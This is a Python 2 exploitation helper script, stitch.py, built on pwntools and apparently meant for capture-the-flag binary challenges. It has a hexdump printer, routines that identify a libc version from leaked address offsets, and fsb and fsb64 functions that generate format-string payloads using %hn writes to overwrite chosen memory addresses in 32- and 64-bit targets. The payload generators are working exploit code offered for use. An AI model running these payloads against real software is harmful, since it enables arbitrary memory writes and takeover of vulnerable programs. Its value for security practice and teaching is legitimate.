#stitch.py
import string
import os
import struct
import sys
from pwn import *

#modify libc path
if 'Apple' in sys.version :
    path = '/Users/kimtae/stitch/libc/'
else :
    path = '/home/stitch/stitch/libc/'

printable = string.printable[:-6]
msg = ''
p32 = lambda x : struct.pack('<I', x)
p64 = lambda x : struct.pack('<Q', x)

def rwh_primes1(n):
    # http://stackoverflow.com/questions/2068372/fastest-way-to-list-all-primes-below-n-in-python/3035188#3035188
    """ Returns  a list of primes < n """
    sieve = [True] * (n/2)
    for i in xrange(3,int(n**0.5)+1,2):
        if sieve[i/2]:
            sieve[i*i/2::i] = [False] * ((n-i*i-1)/(2*i)+1)
    return [2] + [2*i+1 for i in xrange(1,n/2) if sieve[i]]

def dump_str(_input) :
	def padding(s) :
		if len(s) % 16 :
			s += "\x00" * (16 - ( len(s) % 16) )
		return s
	s = padding(_input)
	#print addr
	for addr in range(0x0, len(s), 0x10) :
		print '0x' + '0'*(10-len(str(hex(addr)))) + str(hex(addr))[2:] + '    ',
		#print hex value
		for s_hex in range(addr, addr+16) :
			tmp = str(hex(ord(s[s_hex])))[2:]
			if(len(tmp) == 1):
				print '0' + tmp + ' ',
			else :
				print tmp + ' ',
		#print ascii value
		print '  ',
		l = []
		for s_ascii in range(addr, addr+16) :
			if s[s_ascii] in printable :
				l.append(s[s_ascii])
			else :
				l.append('.')
		print ''.join(l)


#input -> find_libc_sub(func1,func2,sub_addr)
#output -> [dict1, dict2, ...]
#dict = {'func1' : addr1, 'func2' : addr2, ...}
#output[0,1, ...]['func'] => addr
def find_libc_sub(func1, func2, sub) :
	global msg
	def find(data, func1, func2, sub) :
		global msg
		data = data.split('\n')
		poprdi_ret = 0
		tmp = ''
		for _str in data :
			if len(_str) == 0 : continue
			func, addr = _str.split('#')
			tmp += func + '=0x' + addr + '\n'
			if func == func1 :
				addr1 = int(addr, 16)
			elif func == func2 :
				addr2 = int(addr, 16)
		if sub == str(abs(addr1 - addr2)) :
			msg += '-'*30 + '\n'
			msg += tmp
			return 1
		else :
			return 0

	if type(sub) == int :
		sub = str(abs(sub))
	for root, dirs, files in os.walk(path):
		for file in files:
			if '.list' == file[-5:] :
				data = open( path + file, 'rb').read()
				if find(data, func1, func2, sub) :
					msg += 'libc=' + file[:-5] + '\n'

	tmp = msg
	msg = ''
	l = tmp.strip().split('-'*30+'\n')[1:]
	_dict = [ {} for i in range(len(l))]

	for i in range(len(l)) :
		_list = l[i].strip().split('\n')
		for a in _list :
			c, d = a.split('=')
			if c == 'libc' : _dict[i][str(c)] = str(d)
			else : _dict[i][str(c)] = int(d, 16)
	return _dict


#input -> find_libc({'func1' : 'addr1[-3:]', 'func2' : 'addr2[-3:]'}, ...)
#output -> [dict1, dict2, ...]
#dict = {'func1' : addr1, 'func2' : addr2 , ...}
#output[0,1, ...]['func'] = addr
def find_libc(input_func) :
	global msg
	def find(input_func, data) :
		global msg
		def check(input_func, tmp) :
			for key in input_func.keys() :
				if input_func[key] == hex(tmp[key])[-3:] : continue
				else : return 0
			return 1
		data = data.split('\n')
		poprdi_ret = 0
		tmp = {}
		ttmp = ''
		for _str in data :
			if len(_str) == 0 : continue
			func, addr = _str.split('#')
			ttmp += func + '=0x' + addr + '\n'
			if func in input_func.keys() :
				tmp[func] = int(addr, 16)
		if check(input_func, tmp) :
			msg += '-'*30 + '\n'
			msg += ''.join([ i + '=' + hex(tmp[i]) + '\n' for i in tmp])
			msg += ttmp
			return 1
		else :
			return 0

	for root, dirs, files in os.walk( path ):
		for file in files:
			if '.list' == file[-5:] :
				data = open( path + file, 'rb').read()
				if find(input_func, data) :
					msg += 'libc=' + file[:-5] + '\n'

	tmp = msg
	msg = ''
	l = tmp.strip().split('-'*30+'\n')[1:]
	_dict = [ {} for i in range(len(l))]

	for i in range(len(l)) :
		_list = l[i].strip().split('\n')
		for a in _list :
			c, d = a.split('=')
			if c == 'libc' : _dict[i][str(c)] = str(d)
			else : _dict[i][str(c)] = int(d, 16)

	return _dict


def fsb(offset, addr_list, written) :
	payload = ''
	_len = written
	default = '%NUMc%OFFSET$hn'
	offset += (8 * len(addr_list))

	for i in range(len(addr_list)) :
		target = addr_list.keys()[i]
		addr = addr_list[target]
		addr_high = addr >> 16
		addr_low = addr & 0x0000ffff
		while (addr_low < _len) :
			addr_low += 0x10000
		num1 = addr_low - _len
		_len += num1
		while (addr_high < _len) :
			addr_high += 0x10000
		num2 = addr_high - _len
		_len += num2

		payload += default.replace('NUM',str(num1)).replace('OFFSET', str(offset))
		offset += 1
		payload += default.replace('NUM',str(num2)).replace('OFFSET', str(offset))
		offset += 1

	while len(payload) != 32*len(addr_list) :
		payload += 'a'

	for i in range(len(addr_list)) :
		target = addr_list.keys()[i]
		for index in range(0, 4, 2) :
			payload += p32(target+index)
	return payload


def fsb64(offset, addr_list, written) :
	payload = ''
	_len = written
	default = '%NUMc%OFFSET$hn'
	offset += (8 * len(addr_list))

	for i in range(len(addr_list)) :
		target = addr_list.keys()[i]
		addr = addr_list[target]
		addr_hh = (addr >> 48)
		addr_hl = (addr >> 32) & 0xffff
		addr_lh = (addr >> 16) & 0xffff
		addr_ll = (addr & 0xffff)

		while (addr_ll < _len) :
			addr_ll += 0x10000
		num1 = addr_ll - _len
		_len += num1
		while (addr_lh < _len) :
			addr_lh += 0x10000
		num2 = addr_lh - _len
		_len += num2
		while (addr_hl < _len) :
			addr_hl += 0x10000
		num3 = addr_hl - _len
		_len += num3
		while (addr_hh < _len) :
			addr_hh += 0x10000
		num4 = addr_hh - _len
		_len += num4

		payload += default.replace('NUM',str(num1)).replace('OFFSET', str(offset))
		offset += 1
		payload += default.replace('NUM',str(num2)).replace('OFFSET', str(offset))
		offset += 1
		payload += default.replace('NUM',str(num3)).replace('OFFSET', str(offset))
		offset += 1
		payload += default.replace('NUM',str(num4)).replace('OFFSET', str(offset))
		offset += 1

	while len(payload) != 64*len(addr_list) :
		payload += 'a'
	for i in range(len(addr_list)) :
		target = addr_list.keys()[i]
		for index in range(0, 8, 2) :
			payload += p64(target+index)
	return payload


if __name__ == '__main__' :
	print 'stitch'

